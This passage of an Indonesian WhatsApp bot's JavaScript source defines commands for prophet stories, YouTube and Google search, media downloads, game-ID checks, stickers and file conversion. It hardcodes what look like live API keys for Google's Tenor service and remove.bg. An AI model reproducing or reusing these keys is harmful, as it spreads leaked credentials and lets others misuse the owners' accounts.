										"title": "Nabi yaqub AS",
										"description": `Nabi Yakub As merupakan anak Nabi Ishaq As. Beliau digambarkan sebagai sosok dengan keimanan yang luar biasa.`,
										"rowId": `${prefix}kisah2 yakub`
									},
									{
										"title": "Nabi Yusuf AS",
										"description": `Beliau merupakan anak ke-12 Nabi Yaqub bin Ishaq. Mukjizat yang dimiliki Nabi Yusuf As adalah mampu menafsirkan mimpi.`,
										"rowId": `${prefix}kisah2 yusuf`
									},
									{
										"title": "Nabi Ayyub AS",
										"description": `Nabi Ayub As bisa dikatakan sebagai satu di antara nabi tersabar yang pernah ada. Kehidupannya penuh kebaikan dan kaya raya.`,
										"rowId": `${prefix}kisah2 ayub`
									},
									{
										"title": "Nabi Dzulkifli AS",
										"description": `Beliau adalah satu di antara utusan Allah yang terkenal dengan kesabaran serta sifat dermawannya.Nabi Zulkifli As adalah anak satu-satunya dari Nabi Ayyub As yang selamat dari reruntuhan rumah.`,
										"rowId": `${prefix}kisah2 Zulkifli`
									},
									{
										"title": "Nabi Syuaib AS",
										"description": `Nabi Syuaib As diutus untuk kaum Madyan, yang ingkar dan menolak ajakan Beliau untuk menyembah kepada Allah SWT.`,
										"rowId": `${prefix}kisah2 suaib`
									},
									{
										"title": "Nabi Yunus AS",
										"description": `Mukjizat Nabi Yunus As yang terkenal adalah tetap selamat ketika ditelan ikan Paus.`,
										"rowId": `${prefix}kisah2 yunus`
									},
									{
										"title": "Nabi Musa AS",
										"description": `Utasan Allah ini merupakan saudara Nabi Harun As, yang dilahirkan di Mesir ketika masa pemerintahan Raja Fir’aun.Kisah mukjizat Nabi Musa yang paling terkenal adalah ketika tongkatnya mampu membelah lautan ketika dikejar oleh Fir’aun`,
										"rowId": `${prefix}kisah2 musa`
									},
									{
										"title": "Nabi Harun AS",
										"description": `Beliau adalah saudara Nabi Musa As yang membantunya berdakwah untuk mengingatkan Fir’aun. Beliau dikaruniai kemampuan berbahasa yang luar biasa.`,
										"rowId": `${prefix}kisah2 harun`
									},
									{
										"title": "Nabi Ilyas AS",
										"description": `Nabi Ilyas As merupakan utusan Allah SWT bagi kaun Bani Israil yang gemar menyembah patung yang diberi nama Ba’al.`,
										"rowId": `${prefix}kisah2 ilyas`
									},
									{
										"title": "Nabi Ilyasa AS",
										"description": `Nabi Ilyas As diutus pada kaum Bani Israil dan Arami, agar mau kembali beriman kepada Allah.`,
										"rowId": `${prefix}kisah2 ilyasa`
									},
									{
										"title": "Nabi Daud AS",
										"description": `Salah satu mukjizat Nabi Daud adalah memilki kitab Zabur. Beliau juga punya kemampuan dapat berkomunikasi dengan burung.`,
										"rowId": `${prefix}kisah2 daud`
									},
									{
										"title": "Nabi Sulaiman AS",
										"description": `Satu di antara mukjizat Nabi Sulaiman As adalah bisa bicara dengan binatang. Ia juga raja yang kaya raya dan dermawan.`,
										"rowId": `${prefix}kisah2 Sulaiman`
									},
									{
										"title": "Nabi Zakariya AS",
										"description": `Nabi Dzakaria As merupakan keturunan dari Nabi Daud As dan juga Nabi Sulaiman As.`,
										"rowId": `${prefix}kisah2 Zakaria`
									},
									{
										"title": "Nabi Yahya AS",
										"description": `Nabi Yahya As adalah anak dari Nabi Zakaria As yang lahir ketika usianya sudah sangat tua.Beliau merupakan seorang manusia yang berprinsip, integritasnya tinggi serta benar-benar menegakkan kebenaran.`,
										"rowId": `${prefix}kisah2 Yahya`
									},
									{
										"title": "Nabi Isa AS",
										"description": `Nabi Isa As terlahir dengan mukjizat Allah SWT pada seorang perempuan suci bernama Maryam. Beliau mendapatkan mukjizat kitab Injil.`,
										"rowId": `${prefix}kisah2 isa`
									},
									{
										"title": "Nabi Muhammad SAW",
										"description": `Nabi Muhammad SAW merupakan nabi terakhir sekaligus penutup. Mukjizat Nabi Muhammad SAW adalah kitab suci Al-Qur'an.\nKitab suci Al-Qur'an sebagai kitab suci yang terakhir sebagai penyempurna kitab-kitab sebelumnya yang diturunkan oleh Allah`,
										"rowId": `${prefix}kisah2 Muhammad`
									}
								]
							}
						],
          listType: 1
                }
            }), {})
            XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break

//[ DOWNLOAD MENU SEARCH MENU]\\ No Apikey
	    case '7yts': case '7ytsearch': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Story WA Anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = '*YouTube Search*\n\n Hasil Pencarian : '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `⭔ No : ${no++}\n⭔ Type : ${i.type}\n⭔ Video ID : ${i.videoId}\n⭔ Title : ${i.title}\n⭔ Views : ${i.views}\n⭔ Duration : ${i.timestamp}\n⭔ Upload At : ${i.ago}\n⭔ Author : ${i.author.name}\n⭔ Url : ${i.url}\n\n─────────────────\n\n`
                }
                XeonBotInc.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
         case '7gugel': case '7google': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Presiden pertama Indonesia`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                reply(teks)
                })
                }
                break
        case '7gimage': case '7googleimage': {
        if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} Soekarno`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `${prefix}gimage ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*----「 GIMAGE SEARCH 」----*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case '7play': case '7ytplay': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} DJ love story`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                    ngen = `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Uploaded : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
`
message = await prepareWAMessageMedia({ image : { url: anu.thumbnail } }, { upload:   XeonBotInc.waUploadToServer })
                template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: {
                        hydratedTemplate: {
                            imageMessage: message.imageMessage,
                            hydratedContentText: ngen,
                            hydratedFooterText: `Memutar untuk ${text}`,
                            hydratedButtons: [{
                                urlButton: {
                                    displayText: '🥬Video Source Link🥬',
                                    url: `${anu.url}`
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '🎵Audio🎵',
                                    id: `#ytmp3 ${anu.url} 320kbps`
                                    }
                                },{quickReplyButton: {
                                    displayText: '🎥VIdeo🎥',
                                    id: `#ytmp4 ${anu.url} 360p`
                                }
                            }]
                        }
                    }
                }), { userJid: m.chat, quoted: m })
                  XeonBotInc.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
            break
	    case '7ytmp3': case '7ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `*Masukan Link YouTube*\n_Contoh :_ ${prefix + command} https://youtube.com/shorts/6853iqLNWKA`
                let quality = args[1] ? args[1] : '320kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 999999) return reply('Audio size is too big '+util.format(media))
                XeonBotInc.sendImage(m.chat, media.thumb, `*〔 YouTube Mp3 〕*

*⭔ Title :* ${media.title}
*⭔ File Size :* ${media.filesizeF}
*⭔ Url :* ${isUrl(text)}
*⭔ Resololution :* ${args[1] || '320kbps'}`, m)
                XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case '7ytmp4': case '7ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `*Masukan Link YouTube*\n_Contoh :_ ${prefix + command} https://youtube.com/shorts/6853iqLNWKA`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 999999) return reply('Video size is too big '+util.format(media))
                XeonBotInc.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `*〔 YouTube Video 〕*

*⭔ Title :* ${media.title}
*⭔ File Size :* ${media.filesizeF}
*⭔ Url :* ${isUrl(text)}
*⭔ Resololution :* ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case '7getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `*Reply pesan bot (List Result yt search)* , dengan caption : ${prefix + command} <nomor list>\n\n*_Contoh :_* ${prefix + command} 1`
                if (!m.quoted) return reply('Reply Pesan (List yt search yang dikirim oleh Bot) ')
                if (!m.quoted.isBaileys) throw `Reply Pesan (List Result yt search yang dikirim oleh Bot)`
            let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin yang Anda tulis tidak ada di list result ytsearch`
                let quality = args[1] ? args[1] : '320kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 999999) return reply('Audio size is too big '+util.format(media))
                XeonBotInc.sendImage(m.chat, media.thumb, `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolution : ${args[1] || '320kbps'}`, m)
                XeonBotInc.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case '7getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `*Reply pesan bot (List Result yt search)* , dengan caption : ${prefix + command} <nomor list>\n\n*_Contoh :_* ${prefix + command} 3 `
                if (!m.quoted) return reply('Reply Pesan (List yt search yang dikirim oleh Bot) ')
                if (!m.quoted.isBaileys) throw `Reply Pesan (List Result yt search yang dikirim oleh Bot)`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin yang Anda tulis tidak ada di list result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return reply('File Over Limit '+util.format(media))
                XeonBotInc.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolution : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case '7pinterest': {
            	
                replay(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}gimage ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result },
                    caption: `*----「 PINTEREST SEARCH 」----*
🤠 *Query* : ${text}
🔗 *Media Url* : ${result}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            
	    case '7couplepp': case '7ppcouple': {
                replay(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                XeonBotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                XeonBotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case '7coffee': case '7kopi': {
            let buttons = [
                    {buttonId: `${prefix}coffe`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕Random Coffee☕`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '7wallpaper': {
            	if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} uciha sasuke`
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `${prefix}wallpaper ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.type}\n⭔ Detail : ${result.source}\n⭔ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '7wikimedia': {
                if (!text) throw `*Apa yang mau di cari?*\n_Contoh :_ ${prefix + command} gunung lawu`
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `${prefix}wikimedia ${text}`, buttonText: {displayText: '➡️Next Image➡️'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `⭔ Title : ${result.title}\n⭔ Source : ${result.source}\n⭔ Media Url : ${result.image}`,
                    footer:  `${global.fake}`,
                    buttons: buttons,
                    headerType: 4
                }
                XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
//[SEARCH MENU]\\ With apikey lol human
                    

//[Game id check  game id cek MENU]\\ With apikey lol human
            case '7cekff': case '7ffcek': {
            	if (!text) throw `*Masukan PlayerID Free Fire !*\n _Contoh:_ ${prefix + command} 570098876`
           m.reply(mess.wait)
 let anu = await fetchJson(`https://api.lolhuman.xyz/api/freefire/${text}?apikey=${global.apilol}`)
replay(`*〔 Free Fire Checker 〕*

*⭔ PlayerID :* ${text}
*⭔ Username :* ${anu.result}`)
}
break
case '7cekmlbb': case '7mlbbcek': {
            	if (!text) throw `*Masukan PlayerID server Mobile Legend !*\n _Contoh:_ \n${prefix + command} 84830127 2169`
            idplayer = args[0]
                serverid = args[1]
m.reply(mess.wait)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/mobilelegend/${idplayer}/${serverid}?apikey=${global.apilol}`)
replay(`*〔 Mobile Legend Checker 〕*

*⭔ PlayerID :* ${idplayer}
*⭔ ServerID :* ${serverid}
*⭔ Username :* ${anu.result}`)
}
break
case '7cekpubg': case '7pubgcek': {
            	if (!text) throw `*Masukan PlayerID PUBG !*\n _Contoh:_\n${prefix + command} 5119961143`
           m.reply(mess.wait)
 let anu = await fetchJson(`https://api.lolhuman.xyz/api/pubg/${text}?apikey=${global.apilol}`)
replay(`*〔 PUBG Checker 〕*

*⭔ PlayerID :* ${text}
*⭔ Username :* ${anu.result}`)
}
break
case '7cekdomino': case '7dominocek': {
            	if (!text) throw `*Masukan UserID Highh Domino !*\n _Contoh:_\n${prefix + command} 291756557`
           m.reply(mess.wait)
 let anu = await fetchJson(`https://api.lolhuman.xyz/api/higghdomino/${text}?apikey=${global.apilol}`)
replay(`*〔 Highh Domino Checker 〕*

*⭔ UserID :* ${text}
*⭔ Username :* ${anu.result}`)
}
break

//[Teks MAKER MENU]\\ With apikey lol human
//nulis

//[Informasi MENU]\\ With apikey lol human

//[STICKER MENU]\\ With apikey lol human
            case 'sticker': case 's': case 'stickergif': case 'sgif': {  
            replay(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return reply('Maximum 10 seconds!')
                let media = await quoted.download()
                let encmedia = await XeonBotInc.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Send/reply Image/Video dengan Caption ${prefix + command}\nVideo Durasi 1-9 detik`
                }
            }
            break
case '7harta': {
	if (!text) throw `*Masukan Teks !*\n_Contoh:_ ${prefix + command} xZrinva`
	m.reply(mess.wait)
		let anu = `https://api.lolhuman.xyz/api/hartatahta?apikey=${global.apilol}&text=${text}`
		XeonBotInc.sendMessage(m.chat, { image: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
		let media = anu
                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            }
break           
case '7hartacustom': {
	if (!text) throw `*Masukan Teks !*\n_Contoh:_ ${prefix + command} Fazrin
Ganteng
Banget
GK BOHONG !`
	m.reply(mess.wait)
		let anu = `https://api.lolhuman.xyz/api/hartacustom?apikey=${global.apilol}&text=${text}`
		XeonBotInc.sendMessage(m.chat, { image: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
		let media = anu
                let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            }
break           
case '7patrick': {
		let anu = `https://api.lolhuman.xyz/api/sticker/patrick?apikey=${global.apilol}`
		    XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
break           
case '7samongus':{
              let anu = `https://api.lolhuman.xyz/api/sticker/amongus?apikey=${global.apilol}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break       
  case '7gawrgura':{
              let anu = `https://api.lolhuman.xyz/api/sticker/gawrgura?apikey=${global.apilol}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break       
  case '7bucinstick':{
              let anu = `https://api.lolhuman.xyz/api/sticker/bucinstick?apikey=${global.apilol}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break       
case '7attp':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/attp?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break
case '7attp2':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/attp2?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
  break
case '7ttp':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '7ttp2':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp2?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '7ttp3':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp3?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '7ttp4':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp4?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '7ttp5':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp5?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
case '7ttp6':{
	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Dasar Wibu`
              let anu = `https://api.lolhuman.xyz/api/ttp6?apikey=${global.apilol}&text=${text}`
              XeonBotInc.sendMessage(m.chat, { sticker: { url: anu },caption: ` ${command} ${text}` }, { quoted: m })
            }
            break
//[convert MENU]\\ With apikey lol human
case '7topdf': {
	if (!text) throw `*Kirim/reply Gambar dengan Caption*  ${prefix + command} judul pdf\n\n_Contoh:_ ${prefix + command} Tugas Biologi`
    m.reply(mess.wait)
 //  https://api.lolhuman.xyz/api/convert2pdf?apikey=fleyvin_soft&filename=LoLHuman.jpg&file=https://i.postimg.cc/CM34YRFb/photo-2021-02-05-10-13-39.jpg
       let { UploadFileUgu, webp2mp4File, TelegraPh  } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                  //  let ana = await fetchJson(api('zenz', `/convert2pdf?apikey=${global.apilol}&filename=${text}&file=${anu}`))               
                  let ana = await fetchJson(api('zenz',`/convert2pdf?apikey=${global.apilol}&filename=LoLHuman.jpg&file=${anu}`))               
                    XeonBotInc.sendMessage(m.chat, {document: {url: ana.result }, mimetype: 'application/pdf', fileName: `${text}`}, {quoted:m})
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    let ana = await fetchJson(api('zenz',`/convert2pdf?apikey=${global.apilol}&filename=LoLHuman.jpg&file=${anu.url}`))               
                    XeonBotInc.sendMessage(m.chat, {document: {url: ana.result }, mimetype: 'application/pdf', fileName: `${text}`}, {quoted:m})
                   //replay(anu.url)
// reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break

 case '7tohex': {
        	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Aku suka sama kamu`
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/convert/strtohex?apikey=${global.apilol}&text=${text}`)
reply(anu.result)
}
break
case '7dhex': {
        	if (!text) throw `*Masukan kode hex*\n_Contoh:_ ${prefix + command} 7375627320797420785a72696e7661`
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/convert/hextostr?apikey=${global.apilol}&hex=${text}`)
reply(anu.result)
}
break
case '7tomorse': {
        	if (!text) throw `*Masukan teks*\n_Contoh:_ ${prefix + command} Aku suka sama kamu`
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/encrypt?apikey=${global.apilol}&text=${text}`)
reply(anu.result)
}
break
case '7dmorse': {
        	if (!text) throw `*Masukan kode morse*\n_Contoh:_ ${prefix + command} -..- --.. .-. .. -. ...- .- `
        	let anu = await fetchJson(`https://api.lolhuman.xyz/api/morse/decrypt?apikey=${global.apilol}&text=${text}`)
reply(anu.result)
}
break
    case '7tobinary': {
            if (!m.quoted) throw `Reply pesan teks dengan caption ${prefix + command}`
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            m.reply(eb)
        }
        break
            case '7dbinary': {
            if (!m.quoted) throw `Reply pesan teks binary dengan caption ${prefix + command}`
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            m.reply(db)
        }
        break
            case '7emojimix': {
	        if (!text) throw `*Masukan emoji1+emoji2*\n_Contoh:_ ${prefix + command} ❤️+😁`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await XeonBotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
         case '7tofoto': case '7toimage': case '7toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `*balas stiker dengan caption*  ${prefix + command}`
                replay(mess.wait)
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    XeonBotInc.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case '7tomp4': case '7tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `*balas stiker dengan caption*  ${prefix + command}`
                replay(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case '7toaud': case '7toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video dengan Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video dengan Caption ${prefix + command}`
            replay(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case '7tomp3': {
            if (/document/.test(mime)) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
            if (!quoted) throw `Send/Reply Video/Audio untuk convert ke MP3 , dengan Caption ${prefix + command}`
            replay(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Converted By ${ `${global.botnma}`}.mp3`}, { quoted : m })
            }
            break
            case '7tovn': case '7toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio dengan Caption*  ${prefix + command}`
            if (!quoted) throw `*Reply Video/Audio dengan Caption*  ${prefix + command}`
            replay(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            XeonBotInc.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case '7togif': {
                if (!quoted) throw 'Reply Sticker'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                replay(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await XeonBotInc.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
                //reply(webpToMp4.result)
            }
            break
	        case '7tourl': {
		//if (!quoted) throw 'Send/Reply Foto/Video/Audio/file dengan Caption ${prefix + command}'
                replay(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh  } = require('./lib/uploader')
                let media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                 reply(anu.url)
                }
                await fs.unlinkSync(media)
            }
            break
            case '7imagenobg': case '7removebg': case '7remove-bg': {
	    if (!quoted) throw `Send/Reply Image dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Send/Reply Image dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Send/Reply Image dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await XeonBotInc.downloadAndSaveMediaMessage(quoted, hmm)
